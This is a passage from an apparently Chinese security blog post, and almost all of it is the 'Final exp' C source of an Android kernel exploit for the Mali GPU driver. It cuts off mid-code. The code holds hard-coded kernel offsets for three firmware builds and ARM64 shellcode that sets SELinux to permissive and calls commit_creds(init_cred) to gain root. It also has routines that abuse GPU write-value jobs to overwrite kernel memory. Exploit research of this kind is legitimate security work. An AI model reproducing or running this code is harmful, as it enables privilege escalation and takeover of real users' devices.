<p>作为验证可以把<code>OVERWRITE_INDEX</code> 设置为 255（0xff），然后在 <code>set_addr_lv3</code> 中对应的设置为<code>pfn |= 0xffUL</code>也能成功命中对应的页表项。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-29_18-23-59.png" alt="Snipaste_2024-11-29_18-23-59"></p>
<p>最终效果如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-12-02_16-48-48.png" alt="Snipaste_2024-12-02_16-48-48"></p>
<h2 id="Final-exp"><a href="#Final-exp" class="headerlink" title="Final exp"></a>Final exp</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/system_properties.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"stdbool.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"mali.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"mali_base_jm_kernel.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"midgard.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALI <span class="string">"/dev/mali0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BASE_MEM_ALIAS_MAX_ENTS ((size_t)24576)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_DOWN(x)	((x) &gt;&gt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_SIZE 16384</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RESERVED_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_RESERVED_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_BASE 0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERWRITE_INDEX 256</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADRP_INIT_INDEX 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_INIT_INDEX 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADRP_COMMIT_INDEX 2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_COMMIT_INDEX 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AVC_DENY_2108 0x92df1c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEL_READ_ENFORCE_2108 0x942ae4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED_2108 0x29a0570</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS_2108 0x180b0c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_INIT_2108 0x9115c000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_COMMIT_2108 0x912c3108</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AVC_DENY_2201 0x930af4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEL_READ_ENFORCE_2201 0x9456bc</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED_2201 0x29b0570</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS_2201 0x183df0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_INIT_2201 0x9115c000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_COMMIT_2201 0x9137c108</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AVC_DENY_2202 0x930b50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEL_READ_ENFORCE_2202 0x94551c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED_2202 0x29b0570</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS_2202 0x183e3c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_INIT_2202 0x9115c000    <span class="comment">//add	x0, x0, #0x570</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_COMMIT_2202 0x9138f108  <span class="comment">//add	x8, x8, #0xe3c</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> debug()(printf(<span class="string">"Press enter to continue.\n"</span>), (void)getchar())</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> sel_read_enforce = SEL_READ_ENFORCE_2108;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> avc_deny = AVC_DENY_2108;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> atom_number = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Overwriting SELinux to permissive</span></span><br><span class="line"><span class="comment">  strb wzr, [x0]</span></span><br><span class="line"><span class="comment">  mov x0, #0</span></span><br><span class="line"><span class="comment">  ret</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> permissive[<span class="number">3</span>] = {<span class="number">0x3900001f</span>, <span class="number">0xd2800000</span>,<span class="number">0xd65f03c0</span>};</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> root_code[<span class="number">8</span>] = {<span class="number">0</span>};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">base_mem_handle</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">		__u64 handle;</span><br><span class="line">	} basep;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">base_mem_aliasing_info</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">base_mem_handle</span> <span class="title">handle</span>;</span></span><br><span class="line">	__u64 offset;</span><br><span class="line">	__u64 length;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">void</span> *addr, <span class="type">int</span> len)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> *buf64 = (<span class="type">size_t</span> *) addr;</span><br><span class="line">    <span class="type">char</span> *buf8 = (<span class="type">char</span> *) addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">2</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  %04x"</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) {</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">" 0x%016lx"</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">"                   "</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">'.'</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">open_dev</span><span class="params">(<span class="type">char</span>* name)</span> {</span><br><span class="line">  <span class="type">int</span> fd = open(name, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"cannot open %s\n"</span>, name);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> fd;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_mali</span><span class="params">(<span class="type">int</span> fd)</span> {</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kbase_ioctl_version_check</span> <span class="title">param</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &amp;param) &lt; <span class="number">0</span>) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"version check failed\n"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kbase_ioctl_set_flags</span> <span class="title">set_flags</span> =</span> {<span class="number">1</span> &lt;&lt; <span class="number">3</span>};</span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &amp;set_flags) &lt; <span class="number">0</span>) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"set flags failed\n"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">setup_tracking_page</span><span class="params">(<span class="type">int</span> fd)</span> {</span><br><span class="line">  <span class="type">void</span>* region = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, <span class="number">0</span>, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);</span><br><span class="line">  <span class="keyword">if</span> (region == MAP_FAILED) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"setup tracking page failed"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> region;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mem_alloc</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">union</span> kbase_ioctl_mem_alloc* alloc)</span> {</span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc) &lt; <span class="number">0</span>) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mem_alloc failed\n"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mem_alias</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">union</span> kbase_ioctl_mem_alias* alias)</span> {</span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) &lt; <span class="number">0</span>) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mem_alias failed\n"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mem_query</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">union</span> kbase_ioctl_mem_query* query)</span> {</span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, KBASE_IOCTL_MEM_QUERY, query) &lt; <span class="number">0</span>) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mem_query failed\n"</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">lo32</span><span class="params">(<span class="type">uint64_t</span> x)</span> {</span><br><span class="line">  <span class="keyword">return</span> x &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">hi32</span><span class="params">(<span class="type">uint64_t</span> x)</span> {</span><br><span class="line">  <span class="keyword">return</span> x &gt;&gt; <span class="number">32</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">write_adrp</span><span class="params">(<span class="type">int</span> rd, <span class="type">uint64_t</span> pc, <span class="type">uint64_t</span> label)</span> {</span><br><span class="line">  <span class="type">uint64_t</span> pc_page = pc &gt;&gt; <span class="number">12</span>;</span><br><span class="line">  <span class="type">uint64_t</span> label_page = label &gt;&gt; <span class="number">12</span>;</span><br><span class="line">  <span class="type">int64_t</span> offset = (label_page - pc_page) &lt;&lt; <span class="number">12</span>;</span><br><span class="line">  <span class="type">int64_t</span> immhi_mask = <span class="number">0xffffe0</span>;</span><br><span class="line">  <span class="type">int64_t</span> immhi = offset &gt;&gt; <span class="number">14</span>;</span><br><span class="line">  <span class="type">int32_t</span> immlo = (offset &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3</span>;</span><br><span class="line">  <span class="type">uint32_t</span> adpr = rd &amp; <span class="number">0x1f</span>;</span><br><span class="line">  adpr |= (<span class="number">1</span> &lt;&lt; <span class="number">28</span>);</span><br><span class="line">  adpr |= (<span class="number">1</span> &lt;&lt; <span class="number">31</span>); <span class="comment">//op</span></span><br><span class="line">  adpr |= immlo &lt;&lt; <span class="number">29</span>;</span><br><span class="line">  adpr |= (immhi_mask &amp; (immhi &lt;&lt; <span class="number">5</span>));</span><br><span class="line">  <span class="keyword">return</span> adpr;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fixup_root_shell</span><span class="params">(<span class="type">uint64_t</span> init_cred, <span class="type">uint64_t</span> commit_cred, <span class="type">uint64_t</span> read_enforce, <span class="type">uint32_t</span> add_init, <span class="type">uint32_t</span> add_commit)</span> {</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> init_adpr = write_adrp(<span class="number">0</span>, read_enforce, init_cred);</span><br><span class="line">  <span class="comment">//Sets x0 to init_cred</span></span><br><span class="line">  root_code[ADRP_INIT_INDEX] = init_adpr;</span><br><span class="line">  root_code[ADD_INIT_INDEX] = add_init;</span><br><span class="line">  <span class="comment">//Sets x8 to commit_creds</span></span><br><span class="line">  root_code[ADRP_COMMIT_INDEX] = write_adrp(<span class="number">8</span>, read_enforce, commit_cred);</span><br><span class="line">  root_code[ADD_COMMIT_INDEX] = add_commit;</span><br><span class="line">  root_code[<span class="number">4</span>] = <span class="number">0xa9bf7bfd</span>; <span class="comment">// stp x29, x30, [sp, #-0x10]</span></span><br><span class="line">  root_code[<span class="number">5</span>] = <span class="number">0xd63f0100</span>; <span class="comment">// blr x8</span></span><br><span class="line">  root_code[<span class="number">6</span>] = <span class="number">0xa8c17bfd</span>; <span class="comment">// ldp x29, x30, [sp], #0x10</span></span><br><span class="line">  root_code[<span class="number">7</span>] = <span class="number">0xd65f03c0</span>; <span class="comment">// ret</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">map_gpu</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">unsigned</span> <span class="type">int</span> pages, <span class="type">bool</span> read_only, <span class="type">int</span> group)</span> {</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">kbase_ioctl_mem_alloc</span> <span class="title">alloc</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (group &lt;&lt; <span class="number">22</span>);</span><br><span class="line">  <span class="type">int</span> prot = PROT_READ | PROT_WRITE;</span><br><span class="line">  <span class="keyword">if</span> (!read_only) {</span><br><span class="line">    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;</span><br><span class="line">    prot |= PROT_WRITE;</span><br><span class="line">  }</span><br><span class="line">  alloc.in.va_pages = pages;</span><br><span class="line">  alloc.in.commit_pages = pages;</span><br><span class="line">  mem_alloc(mali_fd, &amp;alloc);</span><br><span class="line">  <span class="type">void</span>* region = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span> * pages, prot, MAP_SHARED, mali_fd, alloc.out.gpu_va);</span><br><span class="line">  <span class="keyword">if</span> (region == MAP_FAILED) {</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mmap failed"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> region;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to</span><span class="params">(<span class="type">int</span> mali_fd, <span class="type">uint64_t</span> gpu_addr, <span class="type">uint64_t</span> value, <span class="type">int</span> atom_number, <span class="keyword">enum</span> mali_write_value_type type)</span> {</span><br><span class="line">  <span class="type">void</span>* jc_region = map_gpu(mali_fd, <span class="number">1</span>, <span class="literal">false</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">MALI_JOB_HEADER</span> <span class="title">jh</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  jh.is_64b = <span class="literal">true</span>;</span><br><span class="line">  jh.type = MALI_JOB_TYPE_WRITE_VALUE;</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">MALI_WRITE_VALUE_JOB_PAYLOAD</span> <span class="title">payload</span> =</span> {<span class="number">0</span>};</span><br><span class="line">  payload.type = type;</span><br><span class="line">  payload.immediate_value = value;</span><br><span class="line">  payload.address = gpu_addr;</span><br><span class="line"></span><br><span class="line">  MALI_JOB_HEADER_pack((<span class="type">uint32_t</span>*)jc_region, &amp;jh);</span><br><span class="line">  MALI_WRITE_VALUE_JOB_PAYLOAD_pack((<span class="type">uint32_t</span>*)jc_region + <span 